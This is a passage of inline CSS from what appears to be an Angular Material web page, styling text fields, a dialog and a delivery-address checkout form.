      [dir=rtl] .mat-mdc-dialog-actions .mat-button-base+.mat-button-base,
      [dir=rtl] .mat-mdc-dialog-actions .mat-mdc-button-base+.mat-mdc-button-base {
        margin-left: 0;
        margin-right: 8px
      }
    </style>
    <style>
      fa-icon[_ngcontent-isc-c306] {
        float: right;
        padding: 1.5rem .5rem;
        font-size: 1.25rem
      }

      .mdc-dialog__content[_ngcontent-isc-c306] {
        text-align: center
      }

      .mdc-dialog__content[_ngcontent-isc-c306] .info[_ngcontent-isc-c306] {
        margin: 1.5rem 0
      }

      .mdc-dialog__content[_ngcontent-isc-c306] .anonymous-option-divider[_ngcontent-isc-c306] {
        margin: 1rem 0
      }

      .mdc-dialog__content[_ngcontent-isc-c306] .continue-without-register[_ngcontent-isc-c306] {
        margin-bottom: -2.5rem;
        color: var(--basicColor600) !important
      }

      .mdc-dialog__content[_ngcontent-isc-c306] button[_ngcontent-isc-c306] {
        width: 100%;
        height: 3.15rem;
        margin-bottom: 1rem
      }
    </style>
    <style>
      @keyframes spin {
        0% {
          transform: rotate(0)
        }

        to {
          transform: rotate(360deg)
        }
      }

      @keyframes presence {
        0% {
          opacity: 0
        }

        to {
          opacity: 1
        }
      }

      .delivery-address-wrapper[_ngcontent-isc-c482] {
        padding: 0 1rem;
        margin-bottom: 1.75rem
      }

      @media (min-width: 1200px) {
        .delivery-address-wrapper[_ngcontent-isc-c482] {
          padding: 0 7rem
        }
      }

      @media (min-width: 1440px) {
        .delivery-address-wrapper[_ngcontent-isc-c482] {
          padding: 0 11rem
        }
      }

      @media (min-width: 1600px) {
        .delivery-address-wrapper[_ngcontent-isc-c482] {
          padding: 0 18rem
        }
      }

      @media (min-width: 1800px) {
        .delivery-address-wrapper[_ngcontent-isc-c482] {
          padding: 0 23rem
        }
      }

      @media (min-width: 768px) {
        .delivery-address-wrapper[_ngcontent-isc-c482] .form__container[_ngcontent-isc-c482] {
          border-radius: 8px;
          border: solid 1px rgba(0, 0, 0, .12);
          padding: 1.5rem
        }
      }

      @media (min-width: 992px) {
        .delivery-address-wrapper[_ngcontent-isc-c482] .form__container[_ngcontent-isc-c482] {
          margin-bottom: 3rem
        }
      }

      @media (min-width: 992px) {
        .delivery-address-wrapper[_ngcontent-isc-c482] .form__container__content[_ngcontent-isc-c482] {
          width: 50%
        }
      }

      .delivery-address-wrapper[_ngcontent-isc-c482] .form__delivery-zone[_ngcontent-isc-c482] {
        display: inline-block;
        border-radius: 4px;
        background-color: var(--basicColor100);
        margin-bottom: .5rem;
        padding: .5rem 1rem
      }

      .delivery-address-wrapper[_ngcontent-isc-c482] .form__delivery-zone[_ngcontent-isc-c482] fa-icon[_ngcontent-isc-c482] {
        margin-right: .5rem;
        color: var(--basicColor400)
      }

      .delivery-address-wrapper[_ngcontent-isc-c482] .form__delivery-zone[_ngcontent-isc-c482] span[_ngcontent-isc-c482] {
        margin-right: .5rem
      }

      .delivery-address-wrapper[_ngcontent-isc-c482] .form__headline[_ngcontent-isc-c482] {
        margin-top: 1.5rem;
        margin-bottom: 1.5rem
      }

      @media (min-width: 992px) {
        .delivery-address-wrapper[_ngcontent-isc-c482] .form__headline[_ngcontent-isc-c482] {
          margin-top: 3rem
        }
      }

      .delivery-address-wrapper[_ngcontent-isc-c482] .form__caption[_ngcontent-isc-c482] {
        margin-bottom: 1.5rem
      }

      @media (min-width: 992px) {
        .delivery-address-wrapper[_ngcontent-isc-c482] .cart-summary[_ngcontent-isc-c482] {
          margin-top: 6.75rem
        }
      }
    </style>
    <style>
      .delivery-form[_ngcontent-isc-c471] mat-form-field[_ngcontent-isc-c471] {
        display: block
      }

      .delivery-form[_ngcontent-isc-c471] mat-label[_ngcontent-isc-c471] {
        font-size: .875rem
      }

      .delivery-form[_ngcontent-isc-c471] .hemen-fields[_ngcontent-isc-c471] {
        display: flex;
        justify-content: space-between;
        flex-wrap: wrap
      }

      .delivery-form[_ngcontent-isc-c471] .hemen-fields[_ngcontent-isc-c471] mat-form-field[_ngcontent-isc-c471] {
        flex: 0 0 31%
      }

      .delivery-form[_ngcontent-isc-c471] .hemen-fields[_ngcontent-isc-c471] mat-form-field[_ngcontent-isc-c471]:first-of-type,
      .delivery-form[_ngcontent-isc-c471] .hemen-fields[_ngcontent-isc-c471] mat-form-field[_ngcontent-isc-c471]:last-of-type {
        flex: 0 0 100%
      }
    </style>
    <style>
      .mdc-text-field {
        border-top-left-radius: var(--mdc-shape-small, 4px);
        border-top-right-radius: var(--mdc-shape-small, 4px);
        border-bottom-right-radius: 0;
        border-bottom-left-radius: 0;
        display: inline-flex;
        align-items: baseline;
        padding: 0 16px;
        position: relative;
        box-sizing: border-box;
        overflow: hidden;
        will-change: opacity, transform, color
      }

      .mdc-text-field .mdc-floating-label {
        top: 50%;
        transform: translateY(-50%);
        pointer-events: none
      }

      .mdc-text-field__input {
        height: 28px;
        width: 100%;
        min-width: 0;
        border: none;
        border-radius: 0;
        background: none;
        appearance: none;
        padding: 0
      }

      .mdc-text-field__input::-ms-clear {
        display: none
      }

      .mdc-text-field__input::-webkit-calendar-picker-indicator {
        display: none
      }

      .mdc-text-field__input:focus {
        outline: none
      }

      .mdc-text-field__input:invalid {
        box-shadow: none
      }

      @media all {
        .mdc-text-field__input::placeholder {
          opacity: 0
        }
      }

      @media all {
        .mdc-text-field__input:-ms-input-placeholder {
          opacity: 0
        }
      }

      @media all {

        .mdc-text-field--no-label .mdc-text-field__input::placeholder,
        .mdc-text-field--focused .mdc-text-field__input::placeholder {
          opacity: 1
        }
      }

      @media all {

        .mdc-text-field--no-label .mdc-text-field__input:-ms-input-placeholder,
        .mdc-text-field--focused .mdc-text-field__input:-ms-input-placeholder {
          opacity: 1
        }
      }

      .mdc-text-field__affix {
        height: 28px;
        opacity: 0;
        white-space: nowrap
      }

      .mdc-text-field--label-floating .mdc-text-field__affix,
      .mdc-text-field--no-label .mdc-text-field__affix {
        opacity: 1
      }

      @supports(-webkit-hyphens: none) {
        .mdc-text-field--outlined .mdc-text-field__affix {
          align-items: center;
          align-self: center;
          display: inline-flex;
          height: 100%
        }
      }

      .mdc-text-field__affix--prefix {
        padding-left: 0;
        padding-right: 2px
      }

      [dir=rtl] .mdc-text-field__affix--prefix,
      .mdc-text-field__affix--prefix[dir=rtl] {
        padding-left: 2px;
        padding-right: 0
      }

      .mdc-text-field--end-aligned .mdc-text-field__affix--prefix {
        padding-left: 0;
        padding-right: 12px
      }

      [dir=rtl] .mdc-text-field--end-aligned .mdc-text-field__affix--prefix,
      .mdc-text-field--end-aligned .mdc-text-field__affix--prefix[dir=rtl] {
        padding-left: 12px;
        padding-right: 0
      }

      .mdc-text-field__affix--suffix {
        padding-left: 12px;
        padding-right: 0
      }

      [dir=rtl] .mdc-text-field__affix--suffix,
      .mdc-text-field__affix--suffix[dir=rtl] {
        padding-left: 0;
        padding-right: 12px
      }

      .mdc-text-field--end-aligned .mdc-text-field__affix--suffix {
        padding-left: 2px;
        padding-right: 0
      }

      [dir=rtl] .mdc-text-field--end-aligned .mdc-text-field__affix--suffix,
      .mdc-text-field--end-aligned .mdc-text-field__affix--suffix[dir=rtl] {
        padding-left: 0;
        padding-right: 2px
      }

      .mdc-text-field--filled {
        height: 56px
      }

      .mdc-text-field--filled::before {
        display: inline-block;
        width: 0;
        height: 40px;
        content: "";
        vertical-align: 0
      }

      .mdc-text-field--filled .mdc-floating-label {
        left: 16px;
        right: initial
      }

      [dir=rtl] .mdc-text-field--filled .mdc-floating-label,
      .mdc-text-field--filled .mdc-floating-label[dir=rtl] {
        left: initial;
        right: 16px
      }

      .mdc-text-field--filled .mdc-floating-label--float-above {
        transform: translateY(-106%) scale(0.75)
      }

      .mdc-text-field--filled.mdc-text-field--no-label .mdc-text-field__input {
        height: 100%
      }

      .mdc-text-field--filled.mdc-text-field--no-label .mdc-floating-label {
        display: none
      }

      .mdc-text-field--filled.mdc-text-field--no-label::before {
        display: none
      }

      @supports(-webkit-hyphens: none) {
        .mdc-text-field--filled.mdc-text-field--no-label .mdc-text-field__affix {
          align-items: center;
          align-self: center;
          display: inline-flex;
          height: 100%
        }
      }

      .mdc-text-field--outlined {
        height: 56px;
        overflow: visible
      }

      .mdc-text-field--outlined .mdc-floating-label--float-above {
        transform: translateY(-37.25px) scale(1)
      }

      .mdc-text-field--outlined .mdc-floating-label--float-above {
        font-size: .75rem
      }

      .mdc-text-field--outlined.mdc-notched-outline--upgraded .mdc-floating-label--float-above,
      .mdc-text-field--outlined .mdc-notched-outline--upgraded .mdc-floating-label--float-above {
        transform: translateY(-34.75px) scale(0.75)
      }

      .mdc-text-field--outlined.mdc-notched-outline--upgraded .mdc-floating-label--float-above,
      .mdc-text-field--outlined .mdc-notched-outline--upgraded .mdc-floating-label--float-above {
        font-size: 1rem
      }

      .mdc-text-field--outlined .mdc-text-field__input {
        height: 100%
      }

      .mdc-text-field--outlined .mdc-notched-outline .mdc-notched-outline__leading {
        border-top-left-radius: var(--mdc-shape-small, 4px);
        border-top-right-radius: 0;
        border-bottom-right-radius: 0;
        border-bottom-left-radius: var(--mdc-shape-small, 4px)
      }

      [dir=rtl] .mdc-text-field--outlined .mdc-notched-outline .mdc-notched-outline__leading,
      .mdc-text-field--outlined .mdc-notched-outline .mdc-notched-outline__leading[dir=rtl] {
        border-top-left-radius: 0;
        border-top-right-radius: var(--mdc-shape-small, 4px);
        border-bottom-right-radius: var(--mdc-shape-small, 4px);
        border-bottom-left-radius: 0
      }

      @supports(top: max(0%)) {
        .mdc-text-field--outlined .mdc-notched-outline .mdc-notched-outline__leading {
          width: max(12px, var(--mdc-shape-small, 4px))
        }
      }

      @supports(top: max(0%)) {
        .mdc-text-field--outlined .mdc-notched-outline .mdc-notched-outline__notch {
          max-width: calc(100% - max(12px, var(--mdc-shape-small, 4px))*2)
        }
      }

      .mdc-text-field--outlined .mdc-notched-outline .mdc-notched-outline__trailing {
        border-top-left-radius: 0;
        border-top-right-radius: var(--mdc-shape-small, 4px);
        border-bottom-right-radius: var(--mdc-shape-small, 4px);
        border-bottom-left-radius: 0
      }

      [dir=rtl] .mdc-text-field--outlined .mdc-notched-outline .mdc-notched-outline__trailing,
      .mdc-text-field--outlined .mdc-notched-outline .mdc-notched-outline__trailing[dir=rtl] {
        border-top-left-radius: var(--mdc-shape-small, 4px);
        border-top-right-radius: 0;
        border-bottom-right-radius: 0;
        border-bottom-left-radius: var(--mdc-shape-small, 4px)
      }

      @supports(top: max(0%)) {
        .mdc-text-field--outlined {
          padding-left: max(16px, calc(var(--mdc-shape-small, 4px) + 4px))
        }
      }

      @supports(top: max(0%)) {
        .mdc-text-field--outlined {
          padding-right: max(16px, var(--mdc-shape-small, 4px))
        }
      }

      @supports(top: max(0%)) {
        .mdc-text-field--outlined+.mdc-text-field-helper-line {
          padding-left: max(16px, calc(var(--mdc-shape-small, 4px) + 4px))
        }
      }

      @supports(top: max(0%)) {
        .mdc-text-field--outlined+.mdc-text-field-helper-line {
          padding-right: max(16px, var(--mdc-shape-small, 4px))
        }
      }

      .mdc-text-field--outlined.mdc-text-field--with-leading-icon {
        padding-left: 0
      }

      @supports(top: max(0%)) {
        .mdc-text-field--outlined.mdc-text-field--with-leading-icon {
          padding-right: max(16px, var(--mdc-shape-small, 4px))
        }
      }

      [dir=rtl] .mdc-text-field--outlined.mdc-text-field--with-leading-icon,
      .mdc-text-field--outlined.mdc-text-field--with-leading-icon[dir=rtl] {
        padding-right: 0
      }

      @supports(top: max(0%)) {

        [dir=rtl] .mdc-text-field--outlined.mdc-text-field--with-leading-icon,
        .mdc-text-field--outlined.mdc-text-field--with-leading-icon[dir=rtl] {
          padding-left: max(16px, var(--mdc-shape-small, 4px))
        }
      }

      .mdc-text-field--outlined.mdc-text-field--with-trailing-icon {
        padding-right: 0
      }

      @supports(top: max(0%)) {
        .mdc-text-field--outlined.mdc-text-field--with-trailing-icon {
          padding-left: max(16px, calc(var(--mdc-shape-small, 4px) + 4px))
        }
      }

      [dir=rtl] .mdc-text-field--outlined.mdc-text-field--with-trailing-icon,
      .mdc-text-field--outlined.mdc-text-field--with-trailing-icon[dir=rtl] {
        padding-left: 0
      }

      @supports(top: max(0%)) {

        [dir=rtl] .mdc-text-field--outlined.mdc-text-field--with-trailing-icon,
        .mdc-text-field--outlined.mdc-text-field--with-trailing-icon[dir=rtl] {
          padding-right: max(16px, calc(var(--mdc-shape-small, 4px) + 4px))
        }
      }

      .mdc-text-field--outlined.mdc-text-field--with-leading-icon.mdc-text-field--with-trailing-icon {
        padding-left: 0;
        padding-right: 0
      }

      .mdc-text-field--outlined .mdc-notched-outline--notched .mdc-notched-outline__notch {
        padding-top: 1px
      }

      .mdc-text-field--outlined .mdc-floating-label {
        left: 4px;
        right: initial
      }

      [dir=rtl] .mdc-text-field--outlined .mdc-floating-label,
      .mdc-text-field--outlined .mdc-floating-label[dir=rtl] {
        left: initial;
        right: 4px
      }

      .mdc-text-field--outlined .mdc-text-field__input {
        display: flex;
        border: none !important;
        background-color: rgba(0, 0, 0, 0)
      }

      .mdc-text-field--outlined .mdc-notched-outline {
        z-index: 1
      }

      .mdc-text-field--textarea {
        flex-direction: column;
        align-items: center;
        width: auto;
        height: auto;
        padding: 0
      }

      .mdc-text-field--textarea .mdc-floating-label {
        top: 19px
      }

      .mdc-text-field--textarea .mdc-floating-label:not(.mdc-floating-label--float-above) {
        transform: none
      }

      .mdc-text-field--textarea .mdc-text-field__input {
        flex-grow: 1;
        height: auto;
        min-height: 1.5rem;
        overflow-x: hidden;
        overflow-y: auto;
        box-sizing: border-box;
        resize: none;
        padding: 0 16px
      }

      .mdc-text-field--textarea.mdc-text-field--filled::before {
        display: none
      }

      .mdc-text-field--textarea.mdc-text-field--filled .mdc-floating-label--float-above {
        transform: translateY(-10.25px) scale(0.75)
      }

      .mdc-text-field--textarea.mdc-text-field--filled .mdc-text-field__input {
        margin-top: 23px;
        margin-bottom: 9px
      }

      .mdc-text-field--textarea.mdc-text-field--filled.mdc-text-field--no-label .mdc-text-field__input {
        margin-top: 16px;
        margin-bottom: 16px
      }

      .mdc-text-field--textarea.mdc-text-field--outlined .mdc-notched-outline--notched .mdc-notched-outline__notch {
        padding-top: 0
      }

      .mdc-text-field--textarea.mdc-text-field--outlined .mdc-floating-label--float-above {
        transform: translateY(-27.25px) scale(1)
      }

      .mdc-text-field--textarea.mdc-text-field--outlined .mdc-floating-label--float-above {
        font-size: .75rem
      }

      .mdc-text-field--textarea.mdc-text-field--outlined.mdc-notched-outline--upgraded .mdc-floating-label--float-above,
      .mdc-text-field--textarea.mdc-text-field--outlined .mdc-notched-outline--upgraded .mdc-floating-label--float-above {
        transform: translateY(-24.75px) scale(0.75)
      }

      .mdc-text-field--textarea.mdc-text-field--outlined.mdc-notched-outline--upgraded .mdc-floating-label--float-above,
      .mdc-text-field--textarea.mdc-text-field--outlined .mdc-notched-outline--upgraded .mdc-floating-label--float-above {
        font-size: 1rem
      }

      .mdc-text-field--textarea.mdc-text-field--outlined .mdc-text-field__input {
        margin-top: 16px;
        margin-bottom: 16px
      }

      .mdc-text-field--textarea.mdc-text-field--outlined .mdc-floating-label {
        top: 18px
      }

      .mdc-text-field--textarea.mdc-text-field--with-internal-counter .mdc-text-field__input {
        margin-bottom: 2px
      }

      .mdc-text-field--textarea.mdc-text-field--with-internal-counter .mdc-text-field-character-counter {
        align-self: flex-end;
        padding: 0 16px
      }

      .mdc-text-field--textarea.mdc-text-field--with-internal-counter .mdc-text-field-character-counter::after {
        display: inline-block;
        width: 0;
        height: 16px;
        content: "";
        vertical-align: -16px
      }

      .mdc-text-field--textarea.mdc-text-field--with-internal-counter .mdc-text-field-character-counter::before {
        display: none
      }

      .mdc-text-field__resizer {
        align-self: stretch;
        display: inline-flex;
        flex-direction: column;
        flex-grow: 1;
        max-height: 100%;
        max-width: 100%;
        min-height: 56px;
        min-width: fit-content;
        min-width: -moz-available;
        min-width: -webkit-fill-available;
        overflow: hidden;
        resize: both
      }

      .mdc-text-field--filled .mdc-text-field__resizer {
        transform: translateY(-1px)
      }

      .mdc-text-field--filled .mdc-text-field__resizer .mdc-text-field__input,
      .mdc-text-field--filled .mdc-text-field__resizer .mdc-text-field-character-counter {
        transform: translateY(1px)
      }

      .mdc-text-field--outlined .mdc-text-field__resizer {
        transform: translateX(-1px) translateY(-1px)
      }

      [dir=rtl] .mdc-text-field--outlined .mdc-text-field__resizer,
      .mdc-text-field--outlined .mdc-text-field__resizer[dir=rtl] {
        transform: translateX(1px) translateY(-1px)
      }

      .mdc-text-field--outlined .mdc-text-field__resizer .mdc-text-field__input,
      .mdc-text-field--outlined .mdc-text-field__resizer .mdc-text-field-character-counter {
        transform: translateX(1px) translateY(1px)
      }

      [dir=rtl] .mdc-text-field--outlined .mdc-text-field__resizer .mdc-text-field__input,
      [dir=rtl] .mdc-text-field--outlined .mdc-text-field__resizer .mdc-text-field-character-counter,
      .mdc-text-field--outlined .mdc-text-field__resizer .mdc-text-field__input[dir=rtl],
      .mdc-text-field--outlined .mdc-text-field__resizer .mdc-text-field-character-counter[dir=rtl] {
        transform: translateX(-1px) translateY(1px)
      }

      .mdc-text-field--with-leading-icon {
        padding-left: 0;
        padding-right: 16px
      }

      [dir=rtl] .mdc-text-field--with-leading-icon,
      .mdc-text-field--with-leading-icon[dir=rtl] {
        padding-left: 16px;
        padding-right: 0
      }

      .mdc-text-field--with-leading-icon.mdc-text-field--filled .mdc-floating-label {
        max-width: calc(100% - 48px);
        left: 48px;
        right: initial
      }

      [dir=rtl] .mdc-text-field--with-leading-icon.mdc-text-field--filled .mdc-floating-label,
      .mdc-text-field--with-leading-icon.mdc-text-field--filled .mdc-floating-label[dir=rtl] {
        left: initial;
        right: 48px
      }

      .mdc-text-field--with-leading-icon.mdc-text-field--filled .mdc-floating-label--float-above {
        max-width: calc(100% / 0.75 - 64px / 0.75)
      }

      .mdc-text-field--with-leading-icon.mdc-text-field--outlined .mdc-floating-label {
        left: 36px;
        right: initial
      }

      [dir=rtl] .mdc-text-field--with-leading-icon.mdc-text-field--outlined .mdc-floating-label,
      .mdc-text-field--with-leading-icon.mdc-text-field--outlined .mdc-floating-label[dir=rtl] {
        left: initial;
        right: 36px
      }

      .mdc-text-field--with-leading-icon.mdc-text-field--outlined :not(.mdc-notched-outline--notched) .mdc-notched-outline__notch {
        max-width: calc(100% - 60px)
      }

      .mdc-text-field--with-leading-icon.mdc-text-field--outlined .mdc-floating-label--float-above {
        transform: translateY(-37.25px) translateX(-32px) scale(1)
      }

      [dir=rtl] .mdc-text-field--with-leading-icon.mdc-text-field--outlined .mdc-floating-label--float-above,
      .mdc-text-field--with-leading-icon.mdc-text-field--outlined .mdc-floating-label--float-above[dir=rtl] {
        transform: translateY(-37.25px) translateX(32px) scale(1)
      }

      .mdc-text-field--with-leading-icon.mdc-text-field--outlined .mdc-floating-label--float-above {
        font-size: .75rem
      }

      .mdc-text-field--with-leading-icon.mdc-text-field--outlined.mdc-notched-outline--upgraded .mdc-floating-label--float-above,
      .mdc-text-field--with-leading-icon.mdc-text-field--outlined .mdc-notched-outline--upgraded .mdc-floating-label--float-above {
        transform: translateY(-34.75px) translateX(-32px) scale(0.75)
      }

      [dir=rtl] .mdc-text-field--with-leading-icon.mdc-text-field--outlined.mdc-notched-outline--upgraded .mdc-floating-label--float-above,
      [dir=rtl] .mdc-text-field--with-leading-icon.mdc-text-field--outlined .mdc-notched-outline--upgraded .mdc-floating-label--float-above,
      .mdc-text-field--with-leading-icon.mdc-text-field--outlined.mdc-notched-outline--upgraded .mdc-floating-label--float-above[dir=rtl],
      .mdc-text-field--with-leading-icon.mdc-text-field--outlined .mdc-notched-outline--upgraded .mdc-floating-label--float-above[dir=rtl] {
        transform: translateY(-34.75px) translateX(32px) scale(0.75)
      }

      .mdc-text-field--with-leading-icon.mdc-text-field--outlined.mdc-notched-outline--upgraded .mdc-floating-label--float-above,
      .mdc-text-field--with-leading-icon.mdc-text-field--outlined .mdc-notched-outline--upgraded .mdc-floating-label--float-above {
        font-size: 1rem
      }

      .mdc-text-field--with-trailing-icon {
        padding-left: 16px;
        padding-right: 0
      }

      [dir=rtl] .mdc-text-field--with-trailing-icon,
      .mdc-text-field--with-trailing-icon[dir=rtl] {
        padding-left: 0;
        padding-right: 16px
      }

      .mdc-text-field--with-trailing-icon.mdc-text-field--filled .mdc-floating-label {
        max-width: calc(100% - 64px)
      }

      .mdc-text-field--with-trailing-icon.mdc-text-field--filled .mdc-floating-label--float-above {
        max-width: calc(100% / 0.75 - 64px / 0.75)
      }

      .mdc-text-field--with-trailing-icon.mdc-text-field--outlined :not(.mdc-notched-outline--notched) .mdc-notched-outline__notch {
        max-width: calc(100% - 60px)
      }

      .mdc-text-field--with-leading-icon.mdc-text-field--with-trailing-icon {
        padding-left: 0;
        padding-right: 0
      }

      .mdc-text-field--with-leading-icon.mdc-text-field--with-trailing-icon.mdc-text-field--filled .mdc-floating-label {
        max-width: calc(100% - 96px)
      }

      .mdc-text-field--with-leading-icon.mdc-text-field--with-trailing-icon.mdc-text-field--filled .mdc-floating-label--float-above {
        max-width: calc(100% / 0.75 - 96px / 0.75)
      }

      .mdc-text-field-helper-line {
        display: flex;
        justify-content: space-between;
        box-sizing: border-box
      }

      .mdc-text-field+.mdc-text-field-helper-line {
        padding-right: 16px;
        padding-left: 16px
      }

      .mdc-form-field>.mdc-text-field+label {
        align-self: flex-start
      }

      .mdc-text-field--focused .mdc-notched-outline__leading,
      .mdc-text-field--focused .mdc-notched-outline__notch,
      .mdc-text-field--focused .mdc-notched-outline__trailing {
        border-width: 2px
      }

      .mdc-text-field--focused+.mdc-text-field-helper-line .mdc-text-field-helper-text:not(.mdc-text-field-helper-text--validation-msg) {
        opacity: 1
      }

      .mdc-text-field--focused.mdc-text-field--outlined .mdc-notched-outline--notched .mdc-notched-outline__notch {
        padding-top: 2px
      }

      .mdc-text-field--focused.mdc-text-field--outlined.mdc-text-field--textarea .mdc-notched-outline--notched .mdc-notched-outline__notch {
        padding-top: 0
      }

      .mdc-text-field--invalid+.mdc-text-field-helper-line .mdc-text-field-helper-text--validation-msg {
        opacity: 1
      }

      .mdc-text-field--disabled {
        pointer-events: none
      }

      @media screen and (forced-colors: active) {
        .mdc-text-field--disabled .mdc-text-field__input {
          background-color: Window
        }

        .mdc-text-field--disabled .mdc-floating-label {
          z-index: 1
        }
      }

      .mdc-text-field--disabled .mdc-floating-label {
        cursor: default
      }

      .mdc-text-field--disabled.mdc-text-field--filled .mdc-text-field__ripple {
        display: none
      }

      .mdc-text-field--disabled .mdc-text-field__input {
        pointer-events: auto
      }

      .mdc-text-field--end-aligned .mdc-text-field__input {
        text-align: right
      }

      [dir=rtl] .mdc-text-field--end-aligned .mdc-text-field__input,
      .mdc-text-field--end-aligned .mdc-text-field__input[dir=rtl] {
        text-align: left
      }

      [dir=rtl] .mdc-text-field--ltr-text .mdc-text-field__input,
      [dir=rtl] .mdc-text-field--ltr-text .mdc-text-field__affix,
      .mdc-text-field--ltr-text[dir=rtl] .mdc-text-field__input,
      .mdc-text-field--ltr-text[dir=rtl] .mdc-text-field__affix {
        direction: ltr
      }

      [dir=rtl] .mdc-text-field--ltr-text .mdc-text-field__affix--prefix,
      .mdc-text-field--ltr-text[dir=rtl] .mdc-text-field__affix--prefix {
        padding-left: 0;
        padding-right: 2px
      }

      [dir=rtl] .mdc-text-field--ltr-text .mdc-text-field__affix--suffix,
      .mdc-text-field--ltr-text[dir=rtl] .mdc-text-field__affix--suffix {
        padding-left: 12px;
        padding-right: 0
      }

      [dir=rtl] .mdc-text-field--ltr-text .mdc-text-field__icon--leading,
      .mdc-text-field--ltr-text[dir=rtl] .mdc-text-field__icon--leading {
        order: 1
      }

      [dir=rtl] .mdc-text-field--ltr-text .mdc-text-field__affix--suffix,
      .mdc-text-field--ltr-text[dir=rtl] .mdc-text-field__affix--suffix {
        order: 2
      }

      [dir=rtl] .mdc-text-field--ltr-text .mdc-text-field__input,
      .mdc-text-field--ltr-text[dir=rtl] .mdc-text-field__input {
        order: 3
      }

      [dir=rtl] .mdc-text-field--ltr-text .mdc-text-field__affix--prefix,
      .mdc-text-field--ltr-text[dir=rtl] .mdc-text-field__affix--prefix {
        order: 4
      }

      [dir=rtl] .mdc-text-field--ltr-text .mdc-text-field__icon--trailing,
      .mdc-text-field--ltr-text[dir=rtl] .mdc-text-field__icon--trailing {
        order: 5
      }

      [dir=rtl] .mdc-text-field--ltr-text.mdc-text-field--end-aligned .mdc-text-field__input,
      .mdc-text-field--ltr-text.mdc-text-field--end-aligned[dir=rtl] .mdc-text-field__input {
        text-align: right
      }

      [dir=rtl] .mdc-text-field--ltr-text.mdc-text-field--end-aligned .mdc-text-field__affix--prefix,
      .mdc-text-field--ltr-text.mdc-text-field--end-aligned[dir=rtl] .mdc-text-field__affix--prefix {
        padding-right: 12px
      }

      [dir=rtl] .mdc-text-field--ltr-text.mdc-text-field--end-aligned .mdc-text-field__affix--suffix,
      .mdc-text-field--ltr-text.mdc-text-field--end-aligned[dir=rtl] .mdc-text-field__affix--suffix {
        padding-left: 2px
      }

      .mdc-floating-label {
        position: absolute;
        left: 0;
        -webkit-transform-origin: left top;
        transform-origin: left top;
        line-height: 1.15rem;
        text-align: left;
        text-overflow: ellipsis;
        white-space: nowrap;
        cursor: text;
        overflow: hidden;
        will-change: transform
      }

      [dir=rtl] .mdc-floating-label,
      .mdc-floating-label[dir=rtl] {
        right: 0;
        left: auto;
        -webkit-transform-origin: right top;
        transform-origin: right top;
        text-align: right
      }

      .mdc-floating-label--float-above {
        cursor: auto
      }

      .mdc-floating-label--required::after {
        margin-left: 1px;
        margin-right: 0px;
        content: "*"
      }

      [dir=rtl] .mdc-floating-label--required::after,
      .mdc-floating-label--required[dir=rtl]::after {
        margin-left: 0;
        margin-right: 1px
      }

      .mdc-floating-label--float-above {
        transform: translateY(-106%) scale(0.75)
      }

      .mdc-notched-outline {
        display: flex;
        position: absolute;
        top: 0;
        right: 0;
        left: 0;
        box-sizing: border-box;
        width: 100%;
        max-width: 100%;
        height: 100%;
        text-align: left;
        pointer-events: none
      }

      [dir=rtl] .mdc-notched-outline,
      .mdc-notched-outline[dir=rtl] {
        text-align: right
      }

      .mdc-notched-outline__leading,
      .mdc-notched-outline__notch,
      .mdc-notched-outline__trailing {
        box-sizing: border-box;
        height: 100%;
        border-top: 1px solid;
        border-bottom: 1px solid;
        pointer-events: none
      }

      .mdc-notched-outline__leading {
        border-left: 1px solid;
        border-right: none;
        width: 12px
      }

      [dir=rtl] .mdc-notched-outline__leading,
      .mdc-notched-outline__leading[dir=rtl] {
        border-left: none;
        border-right: 1px solid
      }

      .mdc-notched-outline__trailing {
        border-left: none;
        border-right: 1px solid;
        flex-grow: 1
      }

      [dir=rtl] .mdc-notched-outline__trailing,
      .mdc-notched-outline__trailing[dir=rtl] {
        border-left: 1px solid;
        border-right: none
      }

      .mdc-notched-outline__notch {
        flex: 0 0 auto;
        width: auto;
        max-width: calc(100% - 12px * 2)
      }

      .mdc-notched-outline .mdc-floating-label {
        display: inline-block;
        position: relative;
        max-width: 100%
      }

      .mdc-notched-outline .mdc-floating-label--float-above {
        text-overflow: clip
      }

      .mdc-notched-outline--upgraded .mdc-floating-label--float-above {
        max-width: 133.3333333333%
      }

      .mdc-notched-outline--notched .mdc-notched-outline__notch {
        padding-left: 0;
        padding-right: 8px;
        border-top: none
      }

      [dir=rtl] .mdc-notched-outline--notched .mdc-notched-outline__notch,
      .mdc-notched-outline--notched .mdc-notched-outline__notch[dir=rtl] {
        padding-left: 8px;
        padding-right: 0
      }

      .mdc-notched-outline--no-label .mdc-notched-outline__notch {
        display: none
      }

      .mdc-line-ripple::before,
      .mdc-line-ripple::after {
        position: absolute;
        bottom: 0;
        left: 0;
        width: 100%;
        border-bottom-style: solid;
        content: ""
      }

      .mdc-line-ripple::before {
        border-bottom-width: 1px
      }

      .mdc-line-ripple::before {
        z-index: 1
      }

      .mdc-line-ripple::after {
        transform: scaleX(0);
        border-bottom-width: 2px;
        opacity: 0;
        z-index: 2
      }

      .mdc-line-ripple--active::after {
        transform: scaleX(1);
        opacity: 1
      }

      .mdc-line-ripple--deactivating::after {
        opacity: 0
      }

      .mat-mdc-form-field-textarea-control {
        vertical-align: middle;
        resize: vertical;
        box-sizing: border-box;
        height: auto;
        margin: 0;
        padding: 0;
        border: none;
        overflow: auto
      }

      .mat-mdc-form-field-input-control.mat-mdc-form-field-input-control {
        font: inherit;
        border: none
      }

      .mat-mdc-form-field .mat-mdc-floating-label.mdc-floating-label {
        line-height: normal
      }

      .mdc-text-field--no-label:not(.mdc-text-field--textarea) .mat-mdc-form-field-input-control.mdc-text-field__input,
      .mat-mdc-text-field-wrapper .mat-mdc-form-field-input-control {
        height: auto
      }

      .mat-mdc-text-field-wrapper .mat-mdc-form-field-input-control.mdc-text-field__input[type=color] {
        height: 23px
      }

      .mat-mdc-text-field-wrapper {
        height: auto;
        flex: auto
      }

      .mat-mdc-form-field-has-icon-prefix .mat-mdc-text-field-wrapper {
        padding-left: 0
      }

      .mat-mdc-form-field-has-icon-suffix .mat-mdc-text-field-wrapper {
        padding-right: 0
      }

      [dir=rtl] .mat-mdc-text-field-wrapper {
        padding-left: 16px;
        padding-right: 16px
      }

      [dir=rtl] .mat-mdc-form-field-has-icon-suffix .mat-mdc-text-field-wrapper {
        padding-left: 0
      }

      [dir=rtl] .mat-mdc-form-field-has-icon-prefix .mat-mdc-text-field-wrapper {
        padding-right: 0
      }

      .mat-mdc-form-field-label-always-float .mdc-text-field__input::placeholder {
        transition-delay: 40ms;
        transition-duration: 110ms;
        opacity: 1
      }

